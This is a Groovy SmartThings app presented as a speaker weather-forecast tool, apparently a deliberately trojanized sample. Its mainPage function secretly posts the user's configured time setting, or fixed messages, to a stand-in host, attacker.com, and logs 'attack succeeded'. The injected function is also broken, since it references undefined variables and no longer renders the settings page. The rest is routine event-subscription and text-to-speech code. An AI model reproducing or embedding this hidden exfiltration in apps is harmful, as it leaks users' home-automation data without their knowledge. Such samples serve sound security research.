
definition(
    name:"Speaker Weather Forecast",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Play a weather report through your Speaker when the mode changes or other events occur",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Partner/sonos.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Partner/sonos@2 x.png"
)

preferences{
    page(name:"mainPage",title:"Play the weather report on your speaker",install:true,uninstall:true)
    page(name:"chooseTrack",title:"Select a song or station")
    page(name:"timeIntervalInput",title:"Only during a certain time"){
        section{
            input"starting","time",title:"Starting",required:false
            input"ending","time",title:"Ending",required:false
            }
        }
}

def mainPage(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${starting}"
    ]
    ]
    if(oncePerDayOk(lastTime)){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
        if(frequency){
            if(lastTime==null||now()-lastTime>=frequency*60000){
                takeAction(evt)
            }
            else{
                    log.debug"Not taking action because$frequency minutes have not elapsed since last action"
                }
        }
        else{
                takeAction(evt)
            }
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hi"
            ]
            ]
            log.debug"Not taking action because it was already taken today"
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def chooseTrack(){
    dynamicPage(name:"chooseTrack"){
        section{
            input"song","enum",title:"Play this track",required:true,multiple:false,options:songOptions()
            }
        }
}

private anythingSet(){
    for(name in["motion","contact","contactClosed","acceleration","mySwitch","mySwitchOff","arrivalPresence","departurePresence","smoke","water","button1","timeOfDay","triggerModes"]){
        if(settings[name]){
            return true
        }
    }
    return false
}

private ifUnset(Map options,String name,String capability){
    if(!settings[name]){
        input(options,name,capability)
        }
}

private ifSet(Map options,String name,String capability){
    if(settings[name]){
        input(options,name,capability)
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    subscribeToEvents()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    unschedule()
    subscribeToEvents()
}

def subscribeToEvents(){
    subscribe(app,appTouchHandler)
    subscribe(contact,"contact.open",eventHandler)
    subscribe(contactClosed,"contact.closed",eventHandler)
    subscribe(acceleration,"acceleration.active",eventHandler)
    subscribe(motion,"motion.active",eventHandler)
    subscribe(mySwitch,"switch.on",eventHandler)
    subscribe(mySwitchOff,"switch.off",eventHandler)
    subscribe(arrivalPresence,"presence.present",eventHandler)
    subscribe(departurePresence,"presence.not present",eventHandler)
    subscribe(smoke,"smoke.detected",eventHandler)
    subscribe(smoke,"smoke.tested",eventHandler)
    subscribe(smoke,"carbonMonoxide.detected",eventHandler)
    subscribe(water,"water.wet",eventHandler)
    subscribe(button1,"button.pushed",eventHandler)
    
    if(triggerModes){
        subscribe(location,modeChangeHandler)
    }
    
    if(timeOfDay){
        schedule(timeOfDay,scheduledTimeHandler)
    }
    
    if(song){
        saveSelectedSong()
    }
}

def eventHandler(evt){
    log.trace"eventHandler($evt?.name:$evt?.value)"
    if(allOk){
        log.trace"allOk"
        def lastTime=state[frequencyKey(evt)]
        if(oncePerDayOk(lastTime)){
            if(frequency){
                if(lastTime==null||now()-lastTime>=frequency*60000){
                    takeAction(evt)
                }
                else{
                        log.debug"Not taking action because$frequency minutes have not elapsed since last action"
                    }
            }
            else{
                    takeAction(evt)
                }
        }
        else{
                log.debug"Not taking action because it was already taken today"
            }
    }
}

def modeChangeHandler(evt){
    log.trace"modeChangeHandler$evt.name:$evt.value($triggerModes)"
    if(evt.value in triggerModes){
        eventHandler(evt)
    }
}

def scheduledTimeHandler(){
    eventHandler(null)
}

def appTouchHandler(evt){
    takeAction(evt)
}

private takeAction(evt){
    
    loadText()
    
    if(song){
        sonos.playSoundAndTrack(state.sound.uri,state.sound.duration,state.selectedSong,volume)
    }
    else if(resumePlaying){
            sonos.playTrackAndResume(state.sound.uri,state.sound.duration,volume)
        }
        else if(volume){
                sonos.playTrackAtVolume(state.sound.uri,volume)
            }
            else{
                    sonos.playTrack(state.sound.uri)
                }
    
    if(frequency||oncePerDay){
        state[frequencyKey(evt)]=now()
    }
}

private songOptions(){
    
    
    
    def options=new LinkedHashSet()
    if(state.selectedSong?.station){
        options<<state.selectedSong.station
    }
    else if(state.selectedSong?.description){
            
            options<<state.selectedSong.description
        }
    
    
    def states=sonos.statesSince("trackData",new Date(0),[max:30])
    def dataMaps=states.collect{it.jsonValue}
    options.addAll(dataMaps.collect{it.station})
    
    log.trace"${options.size()}songs in list"
    options.take(20)as List
}

private saveSelectedSong(){
    try{
        def thisSong=song
        log.info"Looking for$thisSong"
        def songs=sonos.statesSince("trackData",new Date(0),[max:30]).collect{it.jsonValue}
        log.info"Searching${songs.size()}records"
        
        def data=songs.find{s->s.station==thisSong}
        log.info"Found${data?.station}"
        if(data){
            state.selectedSong=data
            log.debug"Selected song=$state.selectedSong"
        }
        else if(song==state.selectedSong?.station){
                log.debug"Selected existing entry'$song',which is no longer in the last 20 list"
            }
            else{
                    log.warn"Selected song'$song'not found"
                }
    }
    catch(Throwable t){
        log.error t
    }
}

private frequencyKey(evt){
    "lastActionTimeStamp"
}

private dayString(Date date){
    def df=new java.text.SimpleDateFormat("yyyy-MM-dd")
    if(location.timeZone){
        df.setTimeZone(location.timeZone)
    }
    else{
            df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
        }
    df.format(date)
}

private oncePerDayOk(Long lastTime){
    def result=true
    if(oncePerDay){
        result=lastTime?dayString(new Date())!=dayString(new Date(lastTime)):true
        log.trace"oncePerDayOk=$result"
    }
    result
}


private getAllOk(){
    modeOk&&daysOk&&timeOk
}

private getModeOk(){
    def result=!modes||modes.contains(location.mode)
    log.trace"modeOk=$result"
    result
}

private getDaysOk(){
    def result=true
    if(days){
        def df=new java.text.SimpleDateFormat("EEEE")
        if(location.timeZone){
            df.setTimeZone(location.timeZone)
        }
        else{
                df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
            }
        def day=df.format(new Date())
        result=days.contains(day)
    }
    log.trace"daysOk=$result"
    result
}

private getTimeOk(){
    def result=true
    if(starting&&ending){
        def currTime=now()
        def start=timeToday(starting,location?.timeZone).time
        def stop=timeToday(ending,location?.timeZone).time
        result=start<stop?currTime>=start&&currTime<=stop:currTime<=stop||currTime>=start
    }
    log.trace"timeOk=$result"
    result
}

private hhmm(time,fmt="h:mm a")
{
    def t=timeToday(time,location.timeZone)
    def f=new java.text.SimpleDateFormat(fmt)
    f.setTimeZone(location.timeZone?:timeZone(time))
    f.format(t)
}

private getTimeLabel()
{
    (starting&&ending)?hhmm(starting)+"-"+hhmm(ending,"h:mm a z"):""
}


private loadText(){
    if(location.timeZone||zipCode){
        def weather=getWeatherFeature("forecast",zipCode)
        def current=getWeatherFeature("conditions",zipCode)
        def isMetric=location.temperatureScale=="C"
        def delim=""
        def sb=new StringBuilder()
        list(forecastOptions).sort().each{opt->
            if(opt=="0"){
                if(isMetric){
                    sb<<"The current temperature is${Math.round(current.current_observation.temp_c)}degrees."
                }
                else{
                        sb<<"The current temperature is${Math.round(current.current_observation.temp_f)}degrees."
                    }
                delim=""
            }
            else if(opt=="1"){
                    sb<<delim
                    sb<<"Today's forecast is"
                    if(isMetric){
                        sb<<weather.forecast.txt_forecast.forecastday[0].fcttext_metric
                    }
                    else{
                            sb<<weather.forecast.txt_forecast.forecastday[0].fcttext
                        }
                }
                else if(opt=="2"){
                        sb<<delim
                        sb<<"Tonight will be"
                        if(isMetric){
                            sb<<weather.forecast.txt_forecast.forecastday[1].fcttext_metric
                        }
                        else{
                                sb<<weather.forecast.txt_forecast.forecastday[1].fcttext
                            }
                    }
                    else if(opt=="3"){
                            sb<<delim
                            sb<<"Tomorrow will be"
                            if(isMetric){
                                sb<<weather.forecast.txt_forecast.forecastday[2].fcttext_metric
                            }
                            else{
                                    sb<<weather.forecast.txt_forecast.forecastday[2].fcttext
                                }
                        }
            }
        
        def msg=sb.toString()
        msg=msg.replaceAll(/([0-9]+)C/,'$1 degrees')
        log.debug"msg=${msg}"
        state.sound=textToSpeech(msg,true)
    }
    else{
            state.sound=textToSpeech("Please set the location of your hub with the SmartThings mobile app,or enter a zip code to receive weather forecasts.")
        }
}

private list(String s){
    [s]
}
private list(l){
    l
}

